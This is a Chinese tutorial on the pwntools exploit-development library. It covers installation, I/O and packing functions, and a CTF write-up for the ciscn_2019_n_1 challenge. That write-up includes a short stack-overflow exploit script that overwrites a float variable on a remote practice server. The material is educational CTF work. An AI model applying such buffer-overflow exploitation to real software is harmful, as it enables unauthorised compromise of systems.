## 关于pwntools

Documentation: <http://docs.pwntools.com/>

Github: <https://github.com/Gallopsled/pwntools#readme>

<https://github.com/Gallopsled/pwntools-tutorial#readme>

pwntools是一个CTF框架和漏洞利用的python开发库，专为快速开发而设计，旨在使漏洞利用编写尽可能简答；

网上可以看到很多人写的，但是都是比较老的教程，然后官方提供的documentation很详细，但是对于新人来说阅读和实践比较不友好；

## 安装

虽然以前刚开始的时候是用python2来学习pwn，然后也比较方便；但是现在pwntools官方不再支持python2了，建议新人在python3环境下学习pwntools；

Python3环境下安装：

> $ apt-get update
>
> $ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev
> build-essential
>
> $ python3 -m pip install --upgrade pip
>
> $ python3 -m pip install --upgrade pwntools

Python2环境下安装：

> $ apt-get update
>
> $ apt-get install python python-pip python-dev git libssl-dev libffi-dev
> build-essential
>
> $ python2 -m pip install --upgrade pip==20.3.4
>
> $ python2 -m pip install --upgrade pwntools

![1668755213_63772f0dc5cac187989b9.png!small?1668755214466](https://image.3001.net/images/20221118/1668755213_63772f0dc5cac187989b9.png!small?1668755214466)

![1668755230_63772f1e70f8ffa3d675f.png!small?1668755231111](https://image.3001.net/images/20221118/1668755230_63772f1e70f8ffa3d675f.png!small?1668755231111)

可以看到，新版kali也是python3自带pwntools，而python2没有了；

后面内容没有特殊说明，均默认以python3来演示和操作；

# pwntools功能函数

## 通信相关

### 输入输出

####  **接收数据**

> recv(n) - 接收任意数量的可用字节
>
> recvline() - 接收数据直到遇到换行符
>
> recvuntil(delim) - 接收数据直到找到分隔符
>
> recvregex(pattern) - 接收数据直到满足正则表达式模式
>
> recvrepeat(timeout) - 继续接收数据，直到发生超时
>
> clean() - 丢弃所有缓冲数据

####  **发送数据**

发送（数据） - 发送数据

> sendline(line) - 发送数据加上换行符

####  **操作整数**

> pack(int) - 发送一个字长的压缩整数
>
> unpack() - 接收并解包一个字长整数

### 进程操作

为了创建一个与进程对话的tube，只需创建一个进程对象并为其指定目标二进制文件的名称。

> from pwn import *
>
>  
>
>
> io = process('sh')
>
> io.sendline('echo Hello, world')
>
> io.recvline()
>
> # 'Hello, world\n'

![1668755310_63772f6ee36a8aea7af16.png!small?1668755311497](https://image.3001.net/images/20221118/1668755310_63772f6ee36a8aea7af16.png!small?1668755311497)

执行上述代码的时候，可以看到其中有一个BytesWarning，其中导致的原因是一开始pwntools开发的时候是没有python3的，然后python2的str类型就是bytes类型，所以是不需要对这两个数据类型进行额外的处理；但是到了python3之后，str类型是unicode类型了，跟bytes类型有区别了，这就是要额外处理一下，加个b在str类型前面，以此来声明这是bytes类型的数据；

### 网络请求

网络请求也是CTF
PWN中常见的，先本地分析提供的可执行文件，然后完成脚本编写后，需要连接到服务器中执行poc来获取flag；pwntools也提供非常简单的连接函数；

![1668755331_63772f838294dceb888cc.png!small?1668755332093](https://image.3001.net/images/20221118/1668755331_63772f838294dceb888cc.png!small?1668755332093)

> frompwnimport*io=remote('google.com', 80)  
> io.send('GET /\r\n\r\n')  
> io.recvline()  
> # 'HTTP/1.0 200 OK\r\n'

指定不同的请求协议；

> dns = remote('8.8.8.8', 53, typ='udp')
>
> tcp6 = remote('google.com', 80, fam='ipv6')

### Shell请求

pwntools也可以实现shell连接，比如ssh；

> from pwn import *
>
>  
>
>
> session = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0')
>
>  
>
>
> io = session.process('sh', env={"PS1":""})
>
> io.sendline('echo Hello, world!')
>
> io.recvline()
>
> # 'Hello, world!\n

### 串口调试

> from pwn import *
>
>  
>
>
> io = serialtube('/dev/ttyUSB0', baudrate=115200)

## 实用功能程序/功能函数

除了上面通信相关的函数，pwntools还提供了大量的功能函数，这里列举部分常用的，具体可以参考pwnlib.util.*这一块的功能，官方文档：<https://docs.pwntools.com/en/latest/util/crc.html>

### 整数的处理

主要的打包和解包函数知道上下文中的全局设置，例如字节序、位和符号，也可以在函数调用中明确指定它们。

> pack() - 打包任意长度的整数
>
> p16() - 16位
>
> p32() - 32位
>
> unpack() - 解包任意长度的整数
>
> u16() - 16位
>
> u32() - 32位

###
![1668755410_63772fd2758c1239a7f55.png!small?1668755411029](https://image.3001.net/images/20221118/1668755410_63772fd2758c1239a7f55.png!small?1668755411029)

### 文件处理

> frompwnimport*write('filename', 'data')  
> read('filename')  
> # 'data'read('filename', 1)  
> # 'd'

### 散列和编码

![1668755420_63772fdc975c818ccc364.png!small?1668755421151](https://image.3001.net/images/20221118/1668755420_63772fdc975c818ccc364.png!small?1668755421151)

![1668755426_63772fe2976b0544a3cc5.png!small?1668755427044](https://image.3001.net/images/20221118/1668755426_63772fe2976b0544a3cc5.png!small?1668755427044)

![1668755431_63772fe78286cb540e13e.png!small?1668755432304](https://image.3001.net/images/20221118/1668755431_63772fe78286cb540e13e.png!small?1668755432304)

![1668755447_63772ff7d576089527169.png!small?1668755448386](https://image.3001.net/images/20221118/1668755447_63772ff7d576089527169.png!small?1668755448386)

当然除了这些常见的hash算法，还有很多都是支持，详细参考：<https://docs.pwntools.com/en/latest/util/hashes.html>

好了，学到这里，一些常见CTF中的PWN题比较简单的那种就可以自己来写poc了；来一道题试一下；

## CTF-PWN

### 题目信息

[题目链接：https://buuoj.cn/challenges#ciscn_2019_n_1](https://buuoj.cn/challenges#ciscn_2019_n_1)

![1668755536_637730502177b4e263835.png!small?1668755536605](https://image.3001.net/images/20221118/1668755536_637730502177b4e263835.png!small?1668755536605)

![1668755545_63773059c624b8a5481cb.png!small?1668755546331](https://image.3001.net/images/20221118/1668755545_63773059c624b8a5481cb.png!small?1668755546331)

![1668755555_63773063ca704438d0fb0.png!small?1668755556410](https://image.3001.net/images/20221118/1668755555_63773063ca704438d0fb0.png!small?1668755556410)

![1668755562_6377306a927c84bb0feb6.png!small?1668755563055](https://image.3001.net/images/20221118/1668755562_6377306a927c84bb0feb6.png!small?1668755563055)

![1668755569_63773071be64f1f07a318.png!small?1668755570347](https://image.3001.net/images/20221118/1668755569_63773071be64f1f07a318.png!small?1668755570347)

拿到文件，常规操作，先检测和运行一下，分别结果如上；

既然是可执行文件，那就拖到ida里边看看执行逻辑，目前发现关键的地方就在执行的输出提示，然后可以输入；大概出题人的思路已经有了；

![1668755588_637730846be558b47220c.png!small?1668755589010](https://image.3001.net/images/20221118/1668755588_637730846be558b47220c.png!small?1668755589010)

文件不大，直接到主函数中查看；跟进到func函数，可以看到程序主要逻辑就在这里了；

![1668755632_637730b02f60148e6eeeb.png!small?1668755632792](https://image.3001.net/images/20221118/1668755632_637730b02f60148e6eeeb.png!small?1668755632792)

大概的理解，v1为接收输入点，v2固定为0.0，当v2 == 11.28125是，返回flag值；

从这里的意思其实就能看出v1存在溢出，需要溢出到覆盖v2的值为指定值，以此达到读取flag的效果；

然后溢出点也只有gets v1的时候；

  

因为11.28125为固定值而不是以前题目的位置，所以需要在playload中直接传入其值；这里也可以直接看到v1的长度是44，然后v2是float类型，需要讲11.28125转换成float类型，也就是41
34 80 00

![1668755648_637730c00ac4180a980bb.png!small?1668755648564](https://image.3001.net/images/20221118/1668755648_637730c00ac4180a980bb.png!small?1668755648564)

到这里playload已经出来了，这时候我们用pwntool来本地测试；

## GDB 本地调试

### 本地调试环境安装

![1668755742_6377311eb19f3e6749cf8.png!small?1668755743562](https://image.3001.net/images/20221118/1668755742_6377311eb19f3e6749cf8.png!small?1668755743562)

第一次连接，python会提示没有gdbserver的环境，kali环境下sudo apt-get install
gdbserver，装一个就完事了；当然如果是嵌入式设备的话，需要对应的环境编译一个；

环境准备好后，就可以开始本地的调试了；

![1668755778_637731420ec625d7bd13d.png!small?1668755778770](https://image.3001.net/images/20221118/1668755778_637731420ec625d7bd13d.png!small?1668755778770)

用python中的pwntool来打开gdb调试，这样可以方便查看stack变化；在gdb中输入c或者continue让程序继续运行；这时候输入我们的playload；可以看到程序的执行发生了变化；

![1668755816_637731687feeaa6815eab.png!small?1668755817381](https://image.3001.net/images/20221118/1668755816_637731687feeaa6815eab.png!small?1668755817381)

这时我们就可以构造exp了

> from pwn import *
>
> import struct
>
>  
>
>
> p = remote('node4.buuoj.cn',27075)
>
> payload = b'a'*44 + struct.pack('<f',11.28125)
>
>  
>
>
> p.sendline(payload)
>
> p.interactive()
>
>  
>

或

> from pwn import *
>
>  
>
>
> p=remote('node4.buuoj.cn',27075)
>
>  
>
>
> payload=b"a"*44+p64(0x41348000)
>
> p.sendline(payload)
>
>  
>
>
> p.interactive()

## pwntool其他功能

然后还有一些其他的功能，如context的全局配置；

> from pwn import *
>
> context.arch = 'amd64'

arch:目标架构。有效值为“aarch64”、“arm”、“i386”、“amd64”等。默认值为“i386”。第一次设置时，它会自动将默认
context.bits 和 context.endian 设置为最可能的值。

bits:目标二进制中有多少位组成一个单词，例如32 或 64。

binary:从 ELF 文件中吸收设置。例如，context.binary='/bin/sh'。

endian:根据需要设置为“大”或“小”（默认值）。

log_file:将所有日志记录输出发送到的文件。

log_level:日志的详细程度。有效值是整数（越小越详细）和字符串值，如“debug”、“info”和“error”。

Sign:设置整数打包/解包的默认符号。默认为“无符号”。

terminal:用于打开新窗口的首选终端程序。默认情况下，使用 x-terminal-emulator 或 tmux。

timeout:管操作的默认超时。

update:一次设置多个值，例如context.update(arch='mips', bits=64, endian='big')。

还有ELFs文件的操作、ROP、日志打印、内存泄露、debug等功能和高阶用法，这些留到后面再来补充；

【参考】：<https://github.com/Gallopsled/pwntools-tutorial#readme>

【参考】：<http://docs.pwntools.com/>

【参考】：<https://blog.51cto.com/u_15127592/3915493>

